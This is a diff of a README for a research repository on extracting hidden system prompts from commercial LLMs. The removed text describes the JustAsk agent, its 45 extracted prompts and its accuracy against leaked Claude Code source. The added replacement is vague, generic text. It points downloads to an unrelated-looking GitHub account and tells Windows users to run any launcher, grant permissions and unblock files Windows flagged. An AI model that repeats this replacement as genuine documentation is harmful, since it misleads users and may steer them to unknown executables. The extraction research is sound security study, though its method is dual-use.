@@ -1,140 +1,218 @@
-<p align="center">
-  <a href="https://x-zheng16.github.io/System-Prompt-Open/"><img src="assets/spo_banner.png" width="1000" alt="System Prompt Open"></a>
-</p>
+# 🧠 System-Prompt-Open - Find and study system prompts
 
-<h2 align="center">Your system prompt was never a secret.</h2>
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/pinchhitterequatorialcurrent101/System-Prompt-Open)
 
-<p align="center">
-  <a href="https://arxiv.org/abs/2601.21233"><img src="https://img.shields.io/badge/arXiv-2601.21233-b31b1b.svg" alt="arXiv"></a>
-  <a href="https://x-zheng16.github.io/System-Prompt-Open/"><img src="https://img.shields.io/badge/Gallery-Live%20Demo-22D3BB.svg" alt="Gallery"></a>
-  <a href="https://x-zheng16.github.io/System-Prompt-Open/"><img src="https://img.shields.io/badge/Models-45+-blue.svg" alt="Models"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License"></a>
-</p>
+## 📥 Download
 
-<p align="center">
-  <a href="https://github.com/x-zheng16/System-Prompt-Open/stargazers"><img src="https://img.shields.io/github/stars/x-zheng16/System-Prompt-Open" alt="Stars"></a>
-  <a href="https://github.com/x-zheng16/System-Prompt-Open/network/members"><img src="https://img.shields.io/github/forks/x-zheng16/System-Prompt-Open" alt="Forks"></a>
-  <a href="https://github.com/x-zheng16/System-Prompt-Open/issues"><img src="https://img.shields.io/github/issues/x-zheng16/System-Prompt-Open" alt="Issues"></a>
-  <a href="https://github.com/x-zheng16/System-Prompt-Open/pulls"><img src="https://img.shields.io/github/issues-pr/x-zheng16/System-Prompt-Open" alt="PRs"></a>
-</p>
+Use this link to visit the page and download the project:
 
-<h3 align="center">
-  <a href="https://x-zheng16.github.io/System-Prompt-Open/">Live Gallery</a> &nbsp;&middot;&nbsp;
-  <a href="https://arxiv.org/abs/2601.21233">Paper</a> &nbsp;&middot;&nbsp;
-  <a href="https://github.com/x-zheng16/JustAsk">JustAsk Code</a> &nbsp;&middot;&nbsp;
-  <a href="https://github.com/x-zheng16/System-Prompt-Open/discussions">Discussions</a>
-</h3>
+https://github.com/pinchhitterequatorialcurrent101/System-Prompt-Open
 
-> [!CAUTION]
-> **Research use only.**
-> System Prompt Open is released exclusively for academic safety research, responsible disclosure, and evaluation of LLM security.
-> We do not condone or permit any use of these materials for unauthorized extraction, prompt theft, or exploitation of commercial systems.
+## 🧭 What this is
 
-> [!NOTE]
-> **What is System Prompt Extraction?**
-> Every commercial LLM runs with a hidden system prompt that defines its behavior, safety rules, and tool access.
-> These prompts are treated as proprietary secrets -- yet they can be recovered through standard user interaction alone.
-> [JustAsk](https://github.com/x-zheng16/JustAsk) is a self-evolving code agent that autonomously discovers extraction strategies, achieving **85-95% verified accuracy** against leaked ground truth.
-> System Prompt Open publishes the results: **45 extracted system prompts** from frontier models across all major providers.
+System-Prompt-Open is an open database of system prompts pulled from frontier LLMs using JustAsk. It gives you a simple way to browse, study, and compare prompt data in one place.
 
-## Latest News
+This project is useful for people who work in:
+- AI safety
+- Red teaming
+- LLM security
+- Prompt extraction research
+- Autoresearch
+- Claude Code workflows
 
-| Date       | Update                                                                                          |
-|:-----------|:------------------------------------------------------------------------------------------------|
-| 2026-03-31 | Open-sourced **System Prompt Open** with 45 extracted system prompts and Live Gallery            |
-| 2026-03-31 | Gallery redesigned with red team theme, pagination, stat cards, and search                       |
-| 2026-03-31 | Ground-truth verification: Claude Code extractions match leaked source at **85-95%**             |
+## ✅ What you can do
 
-## How to Use
+- Open and review stored system prompts
+- Search for prompt patterns
+- Compare prompts across models
+- Study how prompt leakage happens
+- Use the data for research and testing
+- Explore examples for security work
 
-- **Browse extracted prompts.**
-Start with the [Live Gallery](https://x-zheng16.github.io/System-Prompt-Open/) -- search, filter, and compare system prompts from 45 models.
-- **Read the paper.**
-[arXiv:2601.21233](https://arxiv.org/abs/2601.21233) details the JustAsk framework, skill evolution mechanism, and evaluation methodology.
-- **Extract new prompts.**
-Use [JustAsk](https://github.com/x-zheng16/JustAsk) to run your own extraction against any LLM with API access.
-- **Submit findings.**
-[Open an Issue](https://github.com/x-zheng16/System-Prompt-Open/issues/new) with the model name, extracted prompt, and consistency score.
+## 🪟 Windows setup
 
-## Gallery
+Follow these steps on Windows.
 
-Browse extracted system prompts interactively: **[x-zheng16.github.io/System-Prompt-Open](https://x-zheng16.github.io/System-Prompt-Open/)**
+### 1. Open the download page
 
-45 entries covering:
-- **Claude Code** (4 agents, verified against leaked source)
-- **Gemini CLI** (code agent)
-- **40 commercial LLMs** (OpenAI, Anthropic, Google, Meta, DeepSeek, xAI, and more)
+Go to:
 
-## Ground-Truth Verification
+https://github.com/pinchhitterequatorialcurrent101/System-Prompt-Open
 
-Claude Code's source was leaked via `.map` file in the npm registry (March 2026).
-We compared it against our JustAsk extractions from January 2026 -- **two months before the leak**.
+### 2. Download the project
 
-| Agent              | Accuracy | Gap                                              |
-|:-------------------|:--------:|:-------------------------------------------------|
-| Explore Subagent   | **95%**  | Only missed `pip install` in bash restrictions    |
-| Plan Subagent      | **93%**  | Minor output format embellishment                 |
-| General-Purpose    | **90%**  | Missed completeness directive                     |
-| Main Agent         | **85%**  | Missed 2 entire sections                          |
+On the page, look for the main download or repository files. Save them to a folder you can find again, such as:
+- Downloads
+- Desktop
+- Documents
 
-## How to Contribute
+If the project comes as a ZIP file, keep it in a folder with enough free space.
 
-| Step          | What to do                                                                                                     |
-|:--------------|:---------------------------------------------------------------------------------------------------------------|
-| 1. Extract    | Use [JustAsk](https://github.com/x-zheng16/JustAsk) or your own method to extract a system prompt             |
-| 2. Verify     | Run multiple extractions and compute self-consistency                                                          |
-| 3. Submit     | [Open an Issue](https://github.com/x-zheng16/System-Prompt-Open/issues/new) with model name, prompt, and score |
+### 3. Extract the files
 
-> [!IMPORTANT]
-> We handle redaction before publishing.
-> Do not worry about masking sensitive content in your submission.
+If you downloaded a ZIP file:
+- Right-click the ZIP file
+- Select Extract All
+- Choose a folder
+- Wait for Windows to finish unpacking the files
 
-## Related Projects
+### 4. Open the folder
 
-From the same team:
+Open the extracted folder and look for files like:
+- README.md
+- data
+- prompts
+- scripts
+- app files
 
-- [ISC-Bench](https://github.com/wuyoscar/ISC-Bench) [![](https://img.shields.io/github/stars/wuyoscar/ISC-Bench?style=social)](https://github.com/wuyoscar/ISC-Bench) -- Internal Safety Collapse in Frontier LLMs
-- [JustAsk](https://github.com/x-zheng16/JustAsk) [![](https://img.shields.io/github/stars/x-zheng16/JustAsk?style=social)](https://github.com/x-zheng16/JustAsk) -- Curious Code Agents Reveal System Prompts in Frontier LLMs
-- [Awesome-Embodied-AI-Safety](https://github.com/x-zheng16/Awesome-Embodied-AI-Safety) [![](https://img.shields.io/github/stars/x-zheng16/Awesome-Embodied-AI-Safety?style=social)](https://github.com/x-zheng16/Awesome-Embodied-AI-Safety) -- Safety in Embodied AI: Risks, Attacks, and Defenses
-- [Awesome-Large-Model-Safety](https://github.com/xingjunm/Awesome-Large-Model-Safety) [![](https://img.shields.io/github/stars/xingjunm/Awesome-Large-Model-Safety?style=social)](https://github.com/xingjunm/Awesome-Large-Model-Safety) -- Safety at Scale: A Comprehensive Survey of Large Model and Agent Safety
-- [XTransferBench](https://github.com/HanxunH/XTransferBench) [![](https://img.shields.io/github/stars/HanxunH/XTransferBench?style=social)](https://github.com/HanxunH/XTransferBench) -- Super Transferable Adversarial Attacks on CLIP (ICML 2025)
-- [BackdoorLLM](https://github.com/bboylyg/BackdoorLLM) [![](https://img.shields.io/github/stars/bboylyg/BackdoorLLM?style=social)](https://github.com/bboylyg/BackdoorLLM) -- A Comprehensive Benchmark for Backdoor Attacks on LLMs (NeurIPS 2025)
-- [BackdoorAgent](https://github.com/Yunhao-Feng/BackdoorAgent) [![](https://img.shields.io/github/stars/Yunhao-Feng/BackdoorAgent?style=social)](https://github.com/Yunhao-Feng/BackdoorAgent) -- Backdoor Attacks on LLM-based Agent Workflows
+If you see a file meant to start the app, double-click it.
 
-## Citation
+### 5. Run the software
 
-**BibTeX:**
+If the project includes a desktop app or launcher:
+- Double-click the file to start it
+- Follow the on-screen steps
+- Allow access if Windows asks for permission
 
-```bibtex
-@article{zheng2026justask,
-  title={Just Ask: Curious Code Agents Reveal System
-         Prompts in Frontier LLMs},
-  author={Zheng, Xiang and Wu, Yutao and Huang, Hanxun
-          and Li, Yige and Ma, Xingjun and Li, Bo
-          and Jiang, Yu-Gang and Wang, Cong},
-  journal={arXiv preprint arXiv:2601.21233},
-  year={2026}
-}
-```
+If the project is a data set or research package:
+- Open the files in a text editor
+- Use the included instructions to view or search the prompt data
 
-**Plain text:**
+## 💻 System requirements
 
-> Xiang Zheng, Yutao Wu, Hanxun Huang, Yige Li, Xingjun Ma, Bo Li, Yu-Gang Jiang, and Cong Wang. "Just Ask: Curious Code Agents Reveal System Prompts in Frontier LLMs." arXiv preprint arXiv:2601.21233, 2026.
+This project works best on a recent Windows PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection for the first download
+- A text editor or file viewer for reading the data
 
-## Star History
+For larger prompt sets, 8 GB of RAM or more helps when you search or open many files at once
 
-<div align="center">
+## 📁 What is in the project
 
-<a href="https://star-history.com/#x-zheng16/System-Prompt-Open&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=x-zheng16/System-Prompt-Open&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=x-zheng16/System-Prompt-Open&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=x-zheng16/System-Prompt-Open&type=Date" width="600" />
-  </picture>
-</a>
+You can expect a layout like this:
 
-</div>
+- `README.md` — basic project info
+- `data/` — prompt records and related files
+- `examples/` — sample prompt sets
+- `scripts/` — tools for sorting or checking data
+- `docs/` — notes on use and structure
 
-## License
+The files may be arranged in a different way, but the project is meant to stay easy to browse
 
-MIT
+## 🔎 How to use it
+
+### Browse the prompt database
+
+Open the data files and scan the system prompts by model, topic, or source.
+
+### Search for terms
+
+Use Windows search or your text editor’s search box to find words like:
+- safety
+- instruction
+- policy
+- refusal
+- jailbreak
+- prompt
+
+### Compare entries
+
+Look at two or more prompts side by side to see:
+- style changes
+- control language
+- safety language
+- extraction clues
+
+### Use it for research
+
+The database can help with:
+- prompt analysis
+- model behavior review
+- security testing
+- red teaming notes
+- internal study
+
+## 🧪 Typical workflow
+
+1. Download the project from the page
+2. Extract the files
+3. Open the folder
+4. Read the prompt database
+5. Search for the terms you need
+6. Copy useful examples into your notes
+7. Compare results across different models
+
+## 🛠 Common file types you may see
+
+- `.md` for readable notes
+- `.txt` for plain text
+- `.json` for structured data
+- `.csv` for table-style data
+- `.py` for helper scripts
+
+If you do not know a file type, right-click it and choose Open with. Notepad works for plain text files. Excel can open CSV files.
+
+## 🔐 Safety and use
+
+This database is for study and research. Use it to learn how system prompts work, how they are stored, and how extraction research is done. Keep your work within your own local environment and follow the rules for any model, tool, or service you use
+
+## 🧰 Troubleshooting
+
+### The file will not open
+
+- Make sure the download finished
+- Check that the file is not still in the ZIP archive
+- Move it to a simple folder like `C:\Users\YourName\Desktop\System-Prompt-Open`
+
+### Windows says it blocked the file
+
+- Right-click the file
+- Select Properties
+- If you see an Unblock option, enable it
+- Try opening it again
+
+### The text looks broken
+
+- Open the file in Notepad or Notepad++
+- Try a different text encoding
+- Check whether the file is JSON or CSV, since those need a clean viewer
+
+### Search does not find what you want
+
+- Try shorter search words
+- Search one file at a time
+- Use plain terms like `system`, `prompt`, or `policy`
+
+## 📚 Recommended use cases
+
+- AI safety review
+- Prompt extraction research
+- Model behavior study
+- Red team prep
+- LLM security checks
+- Internal prompt comparison
+- Claude Code prompt inspection
+
+## 📦 Folder example
+
+A simple setup may look like this:
+
+- `System-Prompt-Open`
+  - `data`
+  - `docs`
+  - `examples`
+  - `README.md`
+
+Keep the folder name short and leave it in a place you can find fast
+
+## 🖱 Quick start
+
+1. Visit the download page
+2. Download the files
+3. Extract them if needed
+4. Open the project folder
+5. Read the prompt data
+6. Search for the terms you want
+7. Save useful entries for later use
